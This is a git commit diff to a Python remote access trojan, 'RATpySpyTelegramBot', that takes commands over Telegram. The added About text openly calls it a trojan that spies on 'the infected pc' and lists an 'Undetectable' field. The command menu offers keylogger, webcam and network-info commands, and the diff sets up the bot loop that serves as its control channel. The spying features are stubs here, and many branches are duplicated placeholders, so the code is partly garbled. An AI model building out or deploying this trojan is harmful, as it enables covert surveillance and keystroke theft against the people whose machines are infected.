1bb4c44046988602e9979c980efba32f9e436c78
SebastianEPH <sebastianeph99@gmail.com>
2020-07-04 11:02:54 -0500

    finish - About

--- RATpySpyTelegramBot.py
+++ RATpySpyTelegramBot.py
@@ -1,16 +1,18 @@
-#██████╗░░█████╗░████████╗  ██████╗░██╗░░░██╗
-#██╔══██╗██╔══██╗╚══██╔══╝  ██╔══██╗╚██╗░██╔╝
-#██████╔╝███████║░░░██║░░░  ██████╔╝░╚████╔╝░
-#██╔══██╗██╔══██║░░░██║░░░  ██╔═══╝░░░╚██╔╝░░
-#██║░░██║██║░░██║░░░██║░░░  ██║░░░░░░░░██║░░░
-#╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░  ╚═╝░░░░░░░░╚═╝░░░
-#░██████╗██████╗░██╗░░░██╗ ████████╗███████╗██╗░░░░░███████╗░██████╗░██████╗░░█████╗░███╗░░░███╗
-#██╔════╝██╔══██╗╚██╗░██╔╝ ╚══██╔══╝██╔════╝██║░░░░░██╔════╝██╔════╝░██╔══██╗██╔══██╗████╗░████║
-#╚█████╗░██████╔╝░╚████╔╝░ ░░░██║░░░█████╗░░██║░░░░░█████╗░░██║░░██╗░██████╔╝███████║██╔████╔██║
-#░╚═══██╗██╔═══╝░░░╚██╔╝░░ ░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
-#██████╔╝██║░░░░░░░░██║░░░ ░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
-#╚═════╝░╚═╝░░░░░░░░╚═╝░░░ ░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝ v1.0
+#██████╗░░█████╗░████████╗░░██████╗░██╗░░░██╗
+#██╔══██╗██╔══██╗╚══██╔══╝░░██╔══██╗╚██╗░██╔╝
+#██████╔╝███████║░░░██║░░░░░██████╔╝░╚████╔╝░
+#██╔══██╗██╔══██║░░░██║░░░░░██╔═══╝░░░╚██╔╝░░
+#██║░░██║██║░░██║░░░██║░░░░░██║░░░░░░░░██║░░░
+#╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░░╚═╝░░░░░░░░╚═╝░░░
+#░██████╗██████╗░██╗░░░██╗░████████╗███████╗██╗░░░░░███████╗░██████╗░██████╗░░█████╗░███╗░░░███╗░░░░░░
+#██╔════╝██╔══██╗╚██╗░██╔╝░╚══██╔══╝██╔════╝██║░░░░░██╔════╝██╔════╝░██╔══██╗██╔══██╗████╗░████║░░░░░░
+#╚█████╗░██████╔╝░╚████╔╝░░░░░██║░░░█████╗░░██║░░░░░█████╗░░██║░░██╗░██████╔╝███████║██╔████╔██║░░░░░░
+#░╚═══██╗██╔═══╝░░░╚██╔╝░░░░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║░░░░░░
+#██████╔╝██║░░░░░░░░██║░░░░░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║░░░░░░
+#╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░v1.0░
 import time                             # Pausar script por segundos predeterminados
+from pydoc import html
+
 import telepot                          # Api de Telegram
 from telepot.loop import MessageLoop    # Api de Telegram
 
@@ -47,62 +49,86 @@ def handle(msg):
     ID = Config.TelegramBot().ID    # ID personal
     cache = ""
     if command == "/about":
-        bot.sendMessage(ID, "/About\n Developed by: SebastiánEPH")
-    elif command == "/screenshot ":
-        bot.sendMessage(ID, "Scrrenshot")
-    elif command == '/helprr':
-        pass
-    else:
-        FUNCTIONELITIES = "/red_info => Información de la Red\n" \
-                          "/webcam   => Toma foto a la WebCam\n" \
-                          "/mas comandos   "
-        bot.sendMessage(ID, FUNCTIONELITIES)
+        about= ""\
+        '\n<b>Developed by:</b> <code>SebastianEPH</code>' \
+        '\n<b>Product Name: </b><a href="https://github.com/SebastianEPH/RATpySpyTelegramBot"> RATpySpyTelegramBot</a> C#' \
+        '\n<b>Type Software:</b> <code>Remote Administration tool</code>' \
+        '\n<b>Versión:</b> <code>1.0</code>' \
+        '\n<b>State:</b> <code>Alfa</code>' \
+        '\n<b>Architecture:</b> <code>x86 bits</code> || <code>x64 bits</code>' \
+        '\n<b>Size:</b> <code>No disponible</code>' \
+        '\n<b>Undetectable:</b> <code>Not tester</code>' \
+        '\n<b>Plataform:</b> <code>Windows 7, 8.1 and 10</code>' \
+        '\n<b>Programming Lenguage:</b> <code>Python 3.8</code>' \
+        '\n<b>Licence:</b> <code>GNU Licence</code>' \
+        '\n<b>IDE:</b> PyCharm <i>[Education license]</i>' \
+        '\n<b>Description:</b>' \
+        '\nRemote access Trojan, spies and obtains information from the infected pc, controlled by telegram commands.  \n<b>[Educational purposes]</b>' \
+        '\n<b></b>' \
+        '\n<b></b>' \
+        '\n<b>Contact: </b>' \
+        '\n<b> - <a href="https://github.com/SebastianEPH">GitHub</a> </b>' \
+        '\n<b> - <a href="https://t.me/sebastianeph">Telegram</a> </b>' \
+        '\n<b> - <a href="https://sebastianeph.github.io/">WebSite</a> </b>' \
+        '\n<b> - SebastianEPH99@gmail.com</b>' \
+        '\n<b></b>' \
+        '\n<b>You can read the documentation at the following link >></b>' \
+        '\n<b></b>'
 
+        bot.sendMessage(TB.TelegramBot().ID, about, parse_mode='html')
+        #bot.sendPhoto(ID,"https://i.imgur.com/SelWET0.png")
+    elif command == "/screenshot":
+        bot.sendMessage(ID, "Scrrenshot")
+    elif command == "/screenshot":
+        bot.sendMessage(ID, "Scrrenshot")
+    elif command == "/screenshot":
+        bot.sendMessage(ID, "Scrrenshot")
+    elif command == "/screenshot":
+        bot.sendMessage(ID, "Scrrenshot")
+    elif command == "/screenshot":
+        bot.sendMessage(ID, "Scrrenshot")
+    elif command == "/screenshot":
+        bot.sendMessage(ID, "Scrrenshot")
+    elif command == "/screenshot":
+        bot.sendMessage(ID, "Scrrenshot")
+    elif command == "/screenshot":
+        bot.sendMessage(ID, "Scrrenshot")
+    elif command == "/screenshot":
+        bot.sendMessage(ID, "Scrrenshot")
+    else:
+        FUNCTIONELITIES = "Write "\
+        "red_info => Información de la Red\n" \
+        "/webcam   => Toma foto a la WebCam\n" \
+        "/webcam   => Toma foto a la WebCam\n" \
+        "/webcam   => Toma foto a la WebCam\n" \
+        "/webcam   => Toma foto a la WebCam\n" \
+        "/keylogger_active     => Active Keylogger\n" \
+        "/keylogger_disable   => Disable Keylogger\n" \
+        "/keylogger_get          => Get keylog\n" \
+        "/webcam   => Toma foto a la WebCam\n" \
+        "/webcam   => Toma foto a la WebCam\n" \
+        "/webcam   => Toma foto a la WebCam\n" \
+        "/about"
+        bot.sendMessage(ID, FUNCTIONELITIES)
 
 # Starting Script
 if __name__ == '__main__':
     print("[RAT] Start")
 
+    # Instancia configuración
+    TB = Config()
+
     # Instancia Bot con Token
-    bot = telepot.Bot(Config.TelegramBot().TOKEN)
-    bot.sendMessage(Config.TelegramBot().ID, "Usted está en linea ...")
+    bot = telepot.Bot(TB.TelegramBot().TOKEN)
+    bot.sendMessage(TB.TelegramBot().ID, "Usted está en linea ...")
+    # Execute other thread what listening
     MessageLoop(bot, handle).run_as_thread()
     print('Listening ...')
-
 
 
 
     # Keep the program running.
     while True:
         time.sleep(10)
-
-
-
-    """
-    
-    Information() # Show Information
-
-    updater = Updater(T_TOKEN, use_context=True)
-    # Get the dispatcher to register handlers
-    dp = updater.dispatcher
-    # on different commands - answer in Telegram
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("help", help))
-    dp.add_handler(CommandHandler("sumar", sumar))
-    # on noncommand i.e message - echo the message on Telegram
-    dp.add_handler(MessageHandler(Filters.text, pizza))
-    # log all errors
-    dp.add_error_handler(error)
-    # Start the Bot
-    updater.start_polling()
-    updater.idle()
-
-
-
-    # Espera comandos
-    print("Esperando comandos...")
-    # pythoncom.PumpMessages()  # Escucha los comandos
-    """
-
 
 
